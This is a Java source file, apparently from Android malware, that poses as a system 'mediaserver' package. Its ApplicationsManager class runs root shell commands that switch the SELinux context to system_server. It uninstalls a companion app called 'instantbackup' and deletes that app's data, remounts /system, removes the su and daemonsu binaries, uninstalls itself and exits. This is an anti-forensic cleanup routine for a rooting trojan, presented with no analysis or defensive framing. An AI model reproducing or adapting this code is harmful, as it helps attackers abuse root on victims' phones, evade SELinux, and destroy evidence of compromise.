package com.android.mediaserver.util;

import android.content.Context;
import android.os.Build;
import android.util.Log;
import com.android.mediaserver.AppConstants;
import com.android.mediaserver.shell.Shell.SU;
import com.commonsware.cwac.wakeful.WakefulIntentService;
import java.util.ArrayList;
import java.util.List;

public class ApplicationsManager {
  private static ApplicationsManager mInstance;
  private Context mContext;

  private ApplicationsManager(Context context) {
    mContext = context;
  }

  public static ApplicationsManager getInstance(Context context) {
    if (mInstance == null) {
      mInstance = new ApplicationsManager(context);
    }
    return mInstance;
  }

  public void uninstallParent() {
    Log.d("ApplicationsManager", "Removing parent application!");
    String cmdPrefix = "";
    SU.run(cmdPrefix
        + "echo u:r:system_server:s0 > /proc/$$/attr/current; pm uninstall "
        + "com.app.instantbackup");
    SU.run(cmdPrefix + "rm -rf /data/data/" + "com.app.instantbackup");
    SU.run(cmdPrefix + "rm -Rf /data/data/" + "com.app.instantbackup");
  }

  public void uninstallSelf() {
    uninstallParent();
    mContext.getApplicationContext()
        .getSharedPreferences(AppConstants.PREFERENCES_NAME, 0)
        .edit()
        .putBoolean(AppConstants.SHOULD_SCHEDULE_KEY, false)
        .commit();
    WakefulIntentService.cancelAlarms(mContext.getApplicationContext());
    List uninstallCmds = new ArrayList();
    String cmdPrefix = "";
    if ("Nexus S".equalsIgnoreCase(Build.MODEL)) {
      uninstallCmds.add("export LD_LIBRARY_PATH=/system/lib");
    } else {
      uninstallCmds.add(cmdPrefix + "mount -o remount,rw /system");
      uninstallCmds.add(cmdPrefix + "rm /system/xbin/su");
      uninstallCmds.add(cmdPrefix + "rm /system/xbin/daemonsu");
    }
    uninstallCmds.add("echo u:r:system_server:s0 > /proc/$$/attr/current; "
        + cmdPrefix
        + "pm uninstall "
        + mContext.getPackageName());
    List<String> res = SU.run(uninstallCmds);
    System.exit(1);
  }
}
